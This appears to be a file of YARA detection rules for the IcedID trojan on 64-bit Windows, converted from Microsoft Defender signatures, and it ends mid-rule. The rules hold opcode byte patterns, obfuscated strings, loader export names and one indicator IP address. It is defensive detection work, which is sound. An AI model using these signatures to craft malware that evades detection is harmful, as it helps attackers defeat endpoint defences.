rule Trojan_Win64_IcedID_GIL_2147811343_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GIL!MTB"
        threat_id = "2147811343"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "xll-transfer.xll" ascii //weight: 1
        $x_1_2 = "JetBrainsdotNeb.dll" ascii //weight: 1
        $x_1_3 = "QueryPerformanceCounter" ascii //weight: 1
        $x_1_4 = "BoagElpyDjmqcxa" ascii //weight: 1
        $x_1_5 = "EikcaTyejkjUjlna" ascii //weight: 1
        $x_1_6 = "FpczxnahPibbqaxfaueg" ascii //weight: 1
        $x_1_7 = "OmukvtwrAzpkFaideoohwyf" ascii //weight: 1
        $x_1_8 = "SetExcel12EntryPt" ascii //weight: 1
        $x_1_9 = "XLCallVer" ascii //weight: 1
        $x_1_10 = "xlAutoOpen" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GMP_2147811349_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GMP!MTB"
        threat_id = "2147811349"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "zflmsgjea" ascii //weight: 1
        $x_1_2 = "svobbiifotuz" ascii //weight: 1
        $x_1_3 = "cebjoibyuscuo" ascii //weight: 1
        $x_1_4 = "Stub_LLVMO_Dll.dll" ascii //weight: 1
        $x_1_5 = "GetTickCount" ascii //weight: 1
        $x_1_6 = "LoadResource" ascii //weight: 1
        $x_1_7 = "VirtualProtect" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_QV_2147811914_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.QV!MTB"
        threat_id = "2147811914"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8b 45 40 b9 3b 01 00 00 2b c8 8b 45 40 2b c8 83 c1 46 89 4d 40 8a 45 48 41 88 00 44 89 5d 40 89 5d 48 8b 45 40 8b 45 40 41 23 c6 3b c7 8b 45 40}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_QM_2147811915_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.QM!MTB"
        threat_id = "2147811915"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8b 45 48 b9 0a 01 00 00 2b c8 8b 45 48 2b c8 41 03 cc 89 4d 48 8a 45 50 88 02 44 89 4d 48 44 89 55 50 8b 45 48 41 23 c6}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_QM_2147811915_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.QM!MTB"
        threat_id = "2147811915"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {69 f6 01 01 00 00 4d 03 f3 0f b6 c0 03 f0 c1 e0 10 33 f0 41 8a 06 84 c0}  //weight: 10, accuracy: High
        $x_3_2 = "ALExrZtxBJlDWFkluCp" ascii //weight: 3
        $x_3_3 = "FdQooBwsyTLuleXPjmKqw" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_QD_2147811957_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.QD!MTB"
        threat_id = "2147811957"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8b 4d 50 8b 45 48 03 c8 41 8b c7 f7 e9 8b c2 c1 e8 1f 03 d0 8d 04 52 3b c8 8b 45 48}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_M_2147812238_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.M!MTB"
        threat_id = "2147812238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {80 44 24 27 04 c6 44 24 28 1c 66 3b c0 74 57 80 44 24 2e 11 c6 44 24 2f 07 66 3b c0 74 2d 80 44 24 2d 39 c6 44 24 2e 11 66 3b c0 74 e2}  //weight: 2, accuracy: High
        $x_1_2 = "uaisydbvtavsghdjaks" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_M_2147812238_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.M!MTB"
        threat_id = "2147812238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "19"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {44 39 d0 0f 85 27 f9 ff ff 8b 04 24 03 04 24 ba d1 b7 ac 8d 29 c2 89 14 24 e9 12 f9 ff ff 8b 04 24 eb c2 8b 04 24 84 d2 74 32 42 8d 14 10}  //weight: 10, accuracy: High
        $x_3_2 = "keptyu" ascii //weight: 3
        $x_3_3 = "ortpw" ascii //weight: 3
        $x_3_4 = "sortyW" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_M_2147812238_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.M!MTB"
        threat_id = "2147812238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "19"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {49 2b fe 48 c1 ff 02 48 8b c1 48 2b c7 48 83 f8 01 72 7a 48 8d 57 01 49 2b f6 48 c1 fe 02 48 8b c6 48 d1 e8 48 2b c8 48 03 c6 4d 8b c4 48 3b ce 4c 0f 43 c0 4c 3b c2 49 0f 43 d0 48 8d 4d d8}  //weight: 10, accuracy: High
        $x_3_2 = "aivouoq" ascii //weight: 3
        $x_3_3 = "armmgyb" ascii //weight: 3
        $x_3_4 = "EntryFunct1" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_M_2147812238_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.M!MTB"
        threat_id = "2147812238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "19"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {48 8b 75 e8 48 89 75 b0 48 8b 7d e0 4c 8b 75 d8 48 b9 ff ff ff ff ff ff ff 3f 48 85 ff 74 03 44 89 3f 48 83 c7 04 48 89 7d e0 41 ff c7 44 89 7d d0 41 83 ff 05 7d 1f}  //weight: 10, accuracy: High
        $x_3_2 = "abgmwelmjsnomicd" ascii //weight: 3
        $x_3_3 = "EntryPoint1" ascii //weight: 3
        $x_3_4 = "balkzqsz" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_M_2147812238_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.M!MTB"
        threat_id = "2147812238"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "21"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "dl2rO0JqTvu\\6FEbAnOpDo" ascii //weight: 3
        $x_3_2 = "UnlockFileEx" ascii //weight: 3
        $x_3_3 = "PostMessageA" ascii //weight: 3
        $x_3_4 = "PostQuitMessage" ascii //weight: 3
        $x_3_5 = "NRfp-si9Eg2_GRM6rd" ascii //weight: 3
        $x_3_6 = "Hipp firebran" ascii //weight: 3
        $x_3_7 = "convolutio endure" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MB_2147812537_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MB!MTB"
        threat_id = "2147812537"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {8b 04 24 ff c0 eb d1 eb 22 48 8b 44 24 08 48 ff c0 3a ed 74 56 88 08 48 8b 04 24 3a c9 74 28 48 ff c8 48 89 44 24 30 eb 5a}  //weight: 5, accuracy: High
        $x_5_2 = "ygsfabayusfjnasfka" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MB_2147812537_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MB!MTB"
        threat_id = "2147812537"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "BQZDzvPETn" ascii //weight: 1
        $x_1_2 = "DllMain" ascii //weight: 1
        $x_1_3 = "GcgqCGFeI" ascii //weight: 1
        $x_1_4 = "LqvFnNKpN" ascii //weight: 1
        $x_1_5 = "uCubdLjx" ascii //weight: 1
        $x_1_6 = "iJbaSHeF14gxJ.dll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MB_2147812537_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MB!MTB"
        threat_id = "2147812537"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "uisbadyugausbdjasyudjas" ascii //weight: 1
        $x_1_2 = "ETPCAnWrBci" ascii //weight: 1
        $x_1_3 = "IPwUAQIxYJcCj" ascii //weight: 1
        $x_1_4 = "IkHhuDeyJOLdzc" ascii //weight: 1
        $x_1_5 = "QzMQEDDloTvmr" ascii //weight: 1
        $x_1_6 = "wDpZObwtcXepRDH" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MB_2147812537_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MB!MTB"
        threat_id = "2147812537"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_3_1 = {08 48 89 74 70 b7 45 89 44 24 18 55 03 e6 57 48 8b ec 48 83 b8 c7 49 8b f9 4d 8b f1 ed b8 1f 5a}  //weight: 3, accuracy: High
        $x_3_2 = {30 48 3b f9 26 ac 8a 42 40 48 03 c1 1c 9c f9 72 05 48 8b 12 bf 79 49 85 c9 0f 84 f4 54 a7 01 4c}  //weight: 3, accuracy: High
        $x_3_3 = {8b c0 4c 63 86 ef 98 83 e2 03 48 03 96 24 e1 03 48 2b c2 48 37 6f 40 0f b6 04 1a 44 5b 11 45 0d}  //weight: 3, accuracy: High
        $x_1_4 = "init" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MB_2147812537_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MB!MTB"
        threat_id = "2147812537"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "21"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "EntryPoint1" ascii //weight: 3
        $x_3_2 = "PluginInit" ascii //weight: 3
        $x_3_3 = "ltgchhdrk" ascii //weight: 3
        $x_3_4 = "csxugphrbwqpsqnm" ascii //weight: 3
        $x_3_5 = "RegOpenKeyTransactedW" ascii //weight: 3
        $x_3_6 = "SwitchToThread" ascii //weight: 3
        $x_3_7 = "InitNetworkAddressControl" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MB_2147812537_5
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MB!MTB"
        threat_id = "2147812537"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "LDargrREErXlMJZuqT" ascii //weight: 5
        $x_2_2 = "cango_attr_letter_spacing_new" ascii //weight: 2
        $x_2_3 = "cango_attr_list_insert" ascii //weight: 2
        $x_2_4 = "cango_cairo_context_set_font_options" ascii //weight: 2
        $x_2_5 = "cango_layout_set_auto_dir" ascii //weight: 2
        $x_1_6 = "init" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MB_2147812537_6
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MB!MTB"
        threat_id = "2147812537"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "qrotliDecoderCreateInstance" ascii //weight: 1
        $x_1_2 = "qrotliEncoderCompressStream" ascii //weight: 1
        $x_1_3 = "qrotliDecoderDecompress" ascii //weight: 1
        $x_1_4 = "qrotliEncoderHasMoreOutput" ascii //weight: 1
        $x_1_5 = "qompressionNative_Deflate" ascii //weight: 1
        $x_1_6 = "qompressionNative_DeflateEnd" ascii //weight: 1
        $x_1_7 = "scab" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GFT_2147812603_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GFT!MTB"
        threat_id = "2147812603"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {48 8b 44 24 70 0f bf 00 0f bf 4c 24 44 03 c1 48 8b 4c 24 70 66 89 01 48 8b 44 24 70 0f bf 00 0f bf 0d ?? ?? ?? ?? 33 c1 66 89 44 24 44 0f b6 44 24 40 d1 f8 88 44 24 40 48 8b 44 24 70 0f bf 00 0f bf 0d ?? ?? ?? ?? 0b c1 66 89 44 24 44 0f be 44 24 43 d1 e0 88 44 24 43}  //weight: 10, accuracy: Low
        $x_1_2 = "Hipp firebran bathe convolutio endure" ascii //weight: 1
        $x_1_3 = "Engorg flou" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GFS_2147812604_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GFS!MTB"
        threat_id = "2147812604"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "23"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {89 e8 31 c9 8a 14 0f 88 14 0e 48 ff c1 39 c8 75 f3 48 89 f0}  //weight: 10, accuracy: High
        $x_10_2 = {0f be fd 31 c7 41 39 dc 72 1b 8a 45 00 ff c3 4c 01 fd 84 c0 0f 85 19 fd ff ff}  //weight: 10, accuracy: High
        $x_1_3 = "VirtualProtect" ascii //weight: 1
        $x_1_4 = "@.gehcont4" ascii //weight: 1
        $x_1_5 = ".voltbl" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ME_2147812924_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ME!MTB"
        threat_id = "2147812924"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {8b 45 48 b9 ?? ?? ?? ?? 2b c8 8b 45 48 2b c8 83 c1 1c 89 4d 48 8a 45 50 88 02 44 89 65 48 44 89 6d 50 8b 45 48 23 c6 7d}  //weight: 10, accuracy: Low
        $x_1_2 = "DllMain" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ME_2147812924_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ME!MTB"
        threat_id = "2147812924"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {49 ff c0 41 f7 ec c1 fa ?? 8b c2 c1 e8 ?? 03 d0 41 8b c4 41 ff c4 6b d2 ?? 2b c2 48 63 c8 48 8b 44 24 ?? 42 0f b6 8c 31 ?? ?? ?? ?? 41 32 4c 00 ff 43 88 4c 18 ff 44 3b 64 24 20 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ME_2147812924_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ME!MTB"
        threat_id = "2147812924"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "19"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {48 8b c6 48 2b c7 48 c1 f8 02 48 83 f8 01 73 5e 49 2b fe 48 c1 ff 02 48 8b c1 48 2b c7 48 83 f8 01 72 7a 48 8d 57 01 49 2b f6 48 c1 fe 02 48 8b c6 48 d1 e8 48 2b c8}  //weight: 10, accuracy: High
        $x_3_2 = "csbuqyasn" ascii //weight: 3
        $x_3_3 = "cwlvqpqpicddfp" ascii //weight: 3
        $x_3_4 = "dzxvervedgy" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ME_2147812924_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ME!MTB"
        threat_id = "2147812924"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "30"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {48 8b 54 24 20 88 04 0a eb 11 e9 7a ff ff ff 89 04 24 8b 44 24 28 e9 63 ff ff ff 8b 04 24 ff c0 eb ed eb 60 48 ff c0 48 89 04 24 3a c0 74 2e 88 08 48 8b 04 24 3a ff 74 eb 48 89 44 24 08 48 8b 44 24 30 eb 4e}  //weight: 10, accuracy: High
        $x_10_2 = {48 8b 44 24 20 48 89 04 24 3a d2 74 da 48 ff c8 48 89 44 24 30 eb 31 eb 3d 48 ff c0 48 89 04 24 66 3b d2 74 ce 4c 89 44 24 18 48 89 54 24 10 3a c9 74 9a 88 08 48 8b 04 24 3a c9 74 dc}  //weight: 10, accuracy: High
        $x_20_3 = "ygsfabayusfjnasfka" ascii //weight: 20
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_20_*) and 1 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_GTP_2147813282_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GTP!MTB"
        threat_id = "2147813282"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {44 8b 03 41 8b ff 4d 03 c1 48 8d 5b 04 eb 24 8d 46 20 40 80 fe 61 0f b6 c8 40 0f b6 c6 0f 4d c8 69 ff 01 01 00 00 0f be c1 03 f8 c1 e0 10 33 f8 49 ff c0 41 8a 30 40 84 f6 75 d4 41 3b fe 74 0d ff c2 41 3b 53 18 72 b8}  //weight: 10, accuracy: High
        $x_1_2 = "loader_dll_64.dll" ascii //weight: 1
        $x_1_3 = "PluginInit" ascii //weight: 1
        $x_1_4 = "DllRegisterServer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GZ_2147813284_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GZ!MTB"
        threat_id = "2147813284"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {44 89 6d d4 44 89 4d d4 8b 45 48 41 33 c2 89 45 48 44 89 6d d4 44 89 4d d4 48 8b 45 e8 0f b7 08 8b 45 48}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GZK_2147813564_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GZK!MTB"
        threat_id = "2147813564"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "13"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {49 8b c6 4d 8d 40 ?? 48 f7 e1 41 ff c1 48 c1 ea ?? 48 6b c2 ?? 48 2b c8 0f b6 44 8c ?? 41 30 40 ?? 49 63 c9 48 81 f9 ?? ?? ?? ?? 72 d3}  //weight: 10, accuracy: Low
        $x_1_2 = "oklwpbrwoyisb" ascii //weight: 1
        $x_1_3 = "qfrfqazdvt" ascii //weight: 1
        $x_1_4 = "nxyaloidgr" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MB_2147813814_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MB!MSR"
        threat_id = "2147813814"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "EntryFunct1" ascii //weight: 2
        $x_2_2 = "EntryPoint1" ascii //weight: 2
        $x_2_3 = "PluginInit" ascii //weight: 2
        $x_2_4 = "xKUzpAWUHQuKEHhnAwJ4MEDN4oDSNpNqXpt" ascii //weight: 2
        $x_2_5 = "HttpSendRequestA" ascii //weight: 2
        $x_2_6 = "Connection" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GZM_2147814243_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GZM!MTB"
        threat_id = "2147814243"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {49 8b c6 48 8b cb 48 f7 e3 48 8b c3 48 2b c2 48 d1 e8 48 03 c2 48 c1 e8 ?? 48 6b c0 15 48 2b c8 0f b6 84 8c ?? ?? ?? ?? 30 06}  //weight: 10, accuracy: Low
        $x_1_2 = "DllRegisterServer" ascii //weight: 1
        $x_1_3 = "PluginInit" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GV_2147814814_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GV!MTB"
        threat_id = "2147814814"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DllRegisterServer" ascii //weight: 1
        $x_1_2 = "PluginInit" ascii //weight: 1
        $x_1_3 = "aftijyffizpqrs" ascii //weight: 1
        $x_1_4 = "aslwdrzdmcyra" ascii //weight: 1
        $x_1_5 = "brnsrvjja" ascii //weight: 1
        $x_1_6 = "210.125.167.240" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MA_2147815506_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MA!MTB"
        threat_id = "2147815506"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {49 83 c1 04 44 0f af 83 94 00 00 00 8b 43 6c 05 ?? ?? ?? ?? 03 c8 01 4a 2c 8b 83 a4 00 00 00 41 8b d0 33 05 ?? ?? ?? ?? 2d ?? ?? ?? ?? c1 ea 10 01 83 8c 00 00 00 48 63 8b 98 00 00 00 48 8b 83 c8 00 00 00 88 14 01 41 8b d0}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MA_2147815506_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MA!MTB"
        threat_id = "2147815506"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "DllRegisterServer" ascii //weight: 10
        $x_1_2 = "1t3Eo8.dll" ascii //weight: 1
        $x_1_3 = "DksPpBKuq" ascii //weight: 1
        $x_1_4 = "LQyhsCdjl" ascii //weight: 1
        $x_1_5 = "SQccDmJlhE" ascii //weight: 1
        $x_1_6 = "VosQlBrX" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MA_2147815506_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MA!MTB"
        threat_id = "2147815506"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "AiDabr" ascii //weight: 2
        $x_2_2 = "BIxovZJ" ascii //weight: 2
        $x_2_3 = "Ba0UT255" ascii //weight: 2
        $x_2_4 = "CHU7ZEzGRi" ascii //weight: 2
